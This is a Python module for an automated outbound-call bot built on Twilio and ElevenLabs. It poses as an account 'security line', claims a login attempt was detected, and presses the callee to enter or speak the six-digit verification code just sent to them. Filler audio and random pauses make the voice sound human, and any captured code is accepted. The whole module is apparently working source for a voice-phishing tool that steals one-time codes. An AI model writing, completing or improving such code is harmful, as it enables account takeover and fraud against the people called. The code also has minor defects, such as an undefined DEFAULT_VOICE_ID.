"""
live_listen.conversation

Asynchronous conversational state machine for outbound calls.

Features:
- Explicit call lifecycle states (GREETING, EXPLANATION, PROMPT_FOR_CODE, REPLAY_REQUESTED,
  CAPTURE_INPUT, VALIDATION).
- Seamless ElevenLabs TTS generation with micro-filler prefetch to reduce perceived latency.
- Injection of generated audio into a live Twilio call via `calls(call_sid).update(twiml=...)`.
- Interruption detection by monitoring incoming audio energy; routes to STT capture on interruption.
- DTMF handler endpoint integration helper.

Integration points:
- The Twilio media websocket in `live_listen/server.py` should call `handle_media_event(call_sid, audio_bytes)`
  for each incoming audio frame to allow interruption detection and STT capture.
- Use `start_conversation(call_sid, chat_id=None)` to initialize a conversation session and begin the GREETING flow.

Note: This module is intentionally provider-agnostic for STT; replace `stt_transcribe()` with a
      production STT provider (Whisper, Google Speech-to-Text streaming, etc.).
"""
import asyncio
import os
import time
import math
import random
from typing import Optional
from enum import Enum
from urllib.parse import quote_plus

from twilio.rest import Client
from config import ACCOUNT_SID, AUTH_TOKEN, NGROK_URL
from live_listen.manager import manager

# ElevenLabs client (optional) - bot.py also may expose a client; we create our own if available
eleven_client = None
try:
    from elevenlabs.client import ElevenLabs
    from config import ELEVENLABS_API_KEY
    if ELEVENLABS_API_KEY:
        try:
            eleven_client = ElevenLabs(api_key=ELEVENLABS_API_KEY)
        except Exception as e:
            print(f"ElevenLabs initialization failed: {e}")
            eleven_client = None
except Exception as e:
    print(f"ElevenLabs import failed: {e}")
    eleven_client = None

twilio_client = Client(ACCOUNT_SID, AUTH_TOKEN)


class ConversationState(str, Enum):
    GREETING = 'GREETING'
    EXPLANATION = 'EXPLANATION'
    PROMPT_FOR_CODE = 'PROMPT_FOR_CODE'
    REPLAY_REQUESTED = 'REPLAY_REQUESTED'
    CAPTURE_INPUT = 'CAPTURE_INPUT'
    VALIDATION = 'VALIDATION'
    ENDED = 'ENDED'


class ConversationSession:
    """Per-call conversation session managing state and I/O."""
    def __init__(self, call_sid: str, chat_id: Optional[int] = None, user_id: Optional[str] = None, custom_audio: Optional[str] = None):
        self.call_sid = call_sid
        self.chat_id = chat_id
        self.user_id = user_id
        self.custom_audio = custom_audio
        self.state: ConversationState = ConversationState.GREETING
        self.lock = asyncio.Lock()
        self.current_play_task: Optional[asyncio.Task] = None
        self.interruption_event = asyncio.Event()
        self.buffer = bytearray()  # buffer to collect incoming audio for STT
        self.last_media_time = time.time()
        self.cleanup_task = None

    def conf_path(self):
        path = os.path.join('conf', self.call_sid)
        os.makedirs(path, exist_ok=True)
        return path


class ConversationManager:
    def __init__(self):
        self.sessions = {}
        self._lock = asyncio.Lock()

    async def get_session(self, call_sid: str) -> ConversationSession:
        async with self._lock:
            s = self.sessions.get(call_sid)
            if not s:
                s = ConversationSession(call_sid)
                self.sessions[call_sid] = s
            return s

    async def remove_session(self, call_sid: str):
        async with self._lock:
            s = self.sessions.pop(call_sid, None)
            if s and s.cleanup_task:
                s.cleanup_task.cancel()


conv_manager = ConversationManager()


async def stt_transcribe(audio_bytes: bytes) -> str:
    """Placeholder STT transcriber.

    Replace this with a low-latency STT provider (e.g., streaming Whisper or Google Speech-to-Text).
    The function receives raw audio bytes (PCM16LE 8000Hz assumed) and returns a best-effort transcript.
    """
    # Simple placeholder: write to file for manual inspection and return empty string
    try:
        tmp = os.path.join('conf', 'stt_last.wav')
        with open(tmp, 'wb') as f:
            f.write(audio_bytes)
    except Exception:
        pass
    # In production, call your STT provider here and return transcript string.
    return ''


def get_user_voice_id(user_id: Optional[str]) -> str:
    if not user_id:
        return VOICE_FALLBACK_VOICE
    path = os.path.join('conf', str(user_id), 'Voice.txt')
    try:
        if os.path.exists(path):
            with open(path, 'r', encoding='utf-8') as f:
                voice_id = f.read().strip()
                if voice_id:
                    return voice_id
    except Exception:
        pass
    return VOICE_FALLBACK_VOICE


def _resolve_conversation_voice_id(voice_id: Optional[str]) -> str:
    if voice_id:
        return voice_id
    return VOICE_FALLBACK_VOICE


async def generate_tts_and_publish(call_sid: str, text: str, filename_prefix: str = 'tts', voice_id: Optional[str] = None) -> Optional[str]:
    """Generate MP3 with ElevenLabs, save to `conf/{call_sid}/{filename_prefix}.mp3` and return public URL.

    Then inject into the live Twilio call by updating the call TwiML to play the audio.
    """
    session = await conv_manager.get_session(call_sid)
    out_path = os.path.join(session.conf_path(), f"{filename_prefix}.mp3")
    try:
        if eleven_client is None:
            print('ElevenLabs not configured; cannot generate TTS')
            return None
        voice_id = _resolve_conversation_voice_id(voice_id or get_user_voice_id(session.user_id))
        for attempt in range(2):
            try:
                gen = eleven_client.text_to_speech.convert(
                    voice_id=voice_id,
                    model_id='eleven_flash_v2_5',
                    text=text,
                    output_format='mp3_44100_128'
                )
                with open(out_path, 'wb') as f:
                    for chunk in gen:
                        if chunk:
                            f.write(chunk)
                if os.path.getsize(out_path) == 0:
                    raise ValueError('ElevenLabs returned empty audio payload')
                # Make public URL via NGROK + /audio route
                url = f"{NGROK_URL.rstrip('/')}/audio?user_id={quote_plus(session.user_id or call_sid)}&file={quote_plus(os.path.basename(out_path))}"
                # Instruct Twilio to play the generated audio now
                try:
                    twilio_client.calls(call_sid).update(twiml=f"<Response><Play>{url}</Play></Response>")
                except Exception as e:
                    print('Twilio play injection failed:', e)
                return url
            except Exception as e:
                print('TTS generation attempt failed:', e)
                if attempt == 0 and voice_id != VOICE_FALLBACK_VOICE:
                    voice_id = VOICE_FALLBACK_VOICE
                    continue
                return None
    except Exception as e:
        print('TTS generation failed:', e)
        return None


# Lightweight prefetch filler audio management
FILLER_CACHE = {}
VOICE_FALLBACK_VOICE = 'EXAVITQu4vr4xnSDxMaL'  # default voice id (Hannah)

async def prefetch_filler(voice_id: str = VOICE_FALLBACK_VOICE):
    """Ensure a set of short filler audios exist to reduce perceived latency."""
    # Examples: 'uh', 'okay', 'no problem', 'one moment'
    fillers = {
        'uh': 'Uh... hold on a second',
        'ok': 'Okay, give me a moment',
        'repeat': 'No problem, I can repeat that for you',
    }
    for key, txt in fillers.items():
        if key in FILLER_CACHE:
            continue
        if eleven_client is None:
            FILLER_CACHE[key] = None
            continue
        try:
            gen = eleven_client.text_to_speech.convert(
                voice_id=voice_id,
                model_id='eleven_flash_v2_5',
                text=txt,
                output_format='mp3_44100_128'
            )
            buf = bytearray()
            for chunk in gen:
                if chunk:
                    buf.extend(chunk)
            FILLER_CACHE[key] = bytes(buf)
        except Exception as e:
            FILLER_CACHE[key] = None


async def play_with_filler(call_sid: str, primary_text: str, voice_id: Optional[str] = None):
    """Play filler and primary TTS with natural pacing."""
    session = await conv_manager.get_session(call_sid)

    # Use provided voice ID or user's default
    if not voice_id:
        voice_id = get_user_voice_id(session.user_id) or DEFAULT_VOICE_ID

    # Generate TTS with human settings
    url = await generate_tts_and_publish(
        call_sid,
        primary_text,
        filename_prefix='primary',
        voice_id=voice_id,
    )

    # Add natural delay
    await asyncio.sleep(0.5 + random.uniform(0, 0.5))

    return url


async def play_custom_audio(session: ConversationSession) -> bool:
    if not session.user_id or not session.custom_audio:
        return False
    filename = session.custom_audio
    if not filename.lower().endswith('.mp3'):
        filename = f"{filename}.mp3"
    path = os.path.join('conf', str(session.user_id), filename)
    if not os.path.exists(path):
        # If the custom audio is the user's custom script, generate it on demand instead of requiring a pre-existing MP3.
        if session.custom_audio == 'custom_script':
            script_path = os.path.join('conf', str(session.user_id), 'custom_script.txt')
            if os.path.exists(script_path):
                try:
                    with open(script_path, 'r', encoding='utf-8') as f:
                        text = f.read().strip()
                except Exception:
                    text = ''
                if text:
                    url = await generate_tts_and_publish(session.call_sid, text, filename_prefix='custom_script', voice_id=get_user_voice_id(session.user_id))
                    return bool(url)
        return False

    url = f"{NGROK_URL.rstrip('/')}/audio?user_id={quote_plus(str(session.user_id))}&file={quote_plus(filename)}"
    try:
        twilio_client.calls(session.call_sid).update(twiml=f"<Response><Play>{url}</Play></Response>")
        return True
    except Exception as e:
        print('Custom audio injection failed:', e)
        return False


async def handle_media_event(call_sid: str, audio_bytes: bytes):
    """Called by the Twilio media handler for each incoming audio frame.

    This function collects audio for STT, detects interruptions by RMS energy,
    and routes to the capture state if we detect human speech while the bot is playing.
    """
    session = await conv_manager.get_session(call_sid)
    session.last_media_time = time.time()
    # Append to buffer (short-term rolling buffer)
    session.buffer.extend(audio_bytes)
    # Keep buffer limited
    if len(session.buffer) > 16000 * 10:
        session.buffer = session.buffer[-16000 * 5:]

    # Simple energy-based voice activity detection (VAD)
    # compute RMS over last 3200 bytes (1600 samples) assuming 16-bit PCM
    window = session.buffer[-3200:]
    if not window:
        return
    rms = 0.0
    # Interpret as signed 16-bit little-endian
    import struct
    try:
        samples = struct.unpack('<' + 'h' * (len(window) // 2), bytes(window[: (len(window)//2)*2]))
        ssum = sum((s/32768.0)**2 for s in samples)
        rms = math.sqrt(ssum / max(1, len(samples)))
    except Exception:
        rms = 0.0

    # Thresholds: if RMS > 0.02 treat as human speech (tune in production)
    if rms > 0.02:
        # If we were playing audio and detect human overlay, treat as interruption
        if session.state in (ConversationState.GREETING, ConversationState.EXPLANATION, ConversationState.PROMPT_FOR_CODE):
            # transition to CAPTURE_INPUT and run STT capture
            async with session.lock:
                session.state = ConversationState.CAPTURE_INPUT
                # capture buffered audio for STT
                buf = bytes(session.buffer)
                session.buffer.clear()
            # perform STT asynchronously
            transcript = await stt_transcribe(buf)
            # handle common spoken-digit parsing if applicable
            digits = parse_spoken_digits(transcript)
            if digits:
                # push into validation flow
                await handle_captured_digits(call_sid, digits)
            else:
                # otherwise route transcript to validation
                await handle_captured_transcript(call_sid, transcript)


def parse_spoken_digits(text: str) -> Optional[str]:
    """Very small helper to extract digits from spoken text.

    This is intentionally minimal — replace with better grammar parsing in production.
    """
    if not text:
        return None
    import re
    digits = re.findall(r'\d', text)
    if digits:
        return ''.join(digits)
    # try to map words to digits
    word_map = {
        'zero': '0','oh':'0','one':'1','two':'2','three':'3','four':'4','for':'4','five':'5',
        'six':'6','seven':'7','eight':'8','nine':'9'
    }
    parts = text.lower().split()
    found = []
    for p in parts:
        if p in word_map:
            found.append(word_map[p])
    if found:
        return ''.join(found)
    return None


async def handle_captured_digits(call_sid: str, digits: str):
    """Handle collected DTMF or spoken digits for validation state."""
    session = await conv_manager.get_session(call_sid)
    async with session.lock:
        session.state = ConversationState.VALIDATION
    # Accept any captured code and continue the flow.
    await play_with_filler(call_sid, 'Thank you, I received that code. Processing it now.')
    async with session.lock:
        session.state = ConversationState.ENDED


async def handle_captured_transcript(call_sid: str, transcript: str):
    """Handle free-form captured transcript during CAPTURE_INPUT."""
    session = await conv_manager.get_session(call_sid)
    # Basic branching: if user asked to repeat
    low = (transcript or '').lower()
    if any(kw in low for kw in ('repeat', 'say that again', 'what', 'huh', 'pardon')):
        async with session.lock:
            session.state = ConversationState.REPLAY_REQUESTED
        await play_with_filler(call_sid, 'No problem, I will repeat that for you.')
        # Then repeat the last prompt — in real flow, store last prompt for repetition
        # Placeholder: replay generic prompt
        await play_with_filler(call_sid, 'Please enter the code we sent you.')
        async with session.lock:
            session.state = ConversationState.PROMPT_FOR_CODE
        return

    # Otherwise, try to extract digits
    digits = parse_spoken_digits(transcript)
    if digits:
        await handle_captured_digits(call_sid, digits)
        return

    # Fallback: ask to repeat
    await play_with_filler(call_sid, 'Sorry, I did not catch that. Could you repeat the code slowly?')
    async with session.lock:
        session.state = ConversationState.PROMPT_FOR_CODE


async def start_conversation(call_sid: str, chat_id: Optional[int] = None, user_id: Optional[str] = None, custom_audio: Optional[str] = None):
    """Initialize conversation and begin GREETING -> EXPLANATION -> PROMPT_FOR_CODE sequence."""
    session = await conv_manager.get_session(call_sid)
    session.chat_id = chat_id
    session.user_id = user_id
    session.custom_audio = custom_audio
    async with session.lock:
        session.state = ConversationState.GREETING

    # Prefetch fillers in background
    asyncio.create_task(prefetch_filler())

    if session.custom_audio:
        try:
            played = await play_custom_audio(session)
            if played:
                async with session.lock:
                    session.state = ConversationState.ENDED
                return
        except Exception:
            pass

    # GREETING
    await play_with_filler(call_sid, 'Hello, this is the HOTTBOIIHITZZ security line calling about your account.')
    async with session.lock:
        session.state = ConversationState.EXPLANATION

    await play_with_filler(call_sid, 'We detected a login attempt and sent a verification code. I will need you to enter the code now.')
    async with session.lock:
        session.state = ConversationState.PROMPT_FOR_CODE

    # Now prompt for code
    await play_with_filler(call_sid, 'Please enter the six digit code using your keypad or speak it now.')
